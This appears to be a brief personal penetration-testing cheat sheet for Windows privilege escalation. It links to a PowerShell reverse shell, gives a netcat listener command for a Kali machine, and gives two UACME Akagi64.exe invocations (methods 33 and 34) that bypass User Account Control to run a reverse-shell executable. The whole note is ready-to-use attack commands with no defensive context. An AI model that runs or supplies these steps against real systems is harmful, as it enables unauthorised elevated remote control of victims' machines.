### 1 - Create a reverse shell script
[[Reverse Shell/Powershell]]

### 2 - Listenner on kali machine
```powershell
rlwrap -cAr nc -nlvp 8080
```

### 3 -  UACME
```powershell
.\Akagi64.exe 33 C:\Windows\Tasks\ex.exe
.\Akagi64.exe 34 C:\tmp\reverseShell.exe
```

